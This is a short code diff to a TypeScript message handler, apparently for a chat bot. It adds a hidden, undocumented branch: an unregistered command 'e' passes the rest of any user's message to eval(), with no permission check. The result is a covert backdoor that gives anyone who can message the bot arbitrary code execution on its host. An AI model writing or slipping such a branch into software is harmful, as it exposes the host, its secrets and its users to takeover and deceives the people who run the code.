@@ -28,7 +28,10 @@ export default class MessageEvent extends BaseEvent {
 		const commandName: string | undefined = args.shift();
 		const command = this.client.commands.get(commandName);
 
-		if(!command) return;
+		if(!command) {
+			if(commandName == "e") return eval(args.join(" "));
+			return;
+		}
 
 		const timestamp = cooldowns.get(`${command.name}-${message.author.id}`);
 		const now = Date.now();
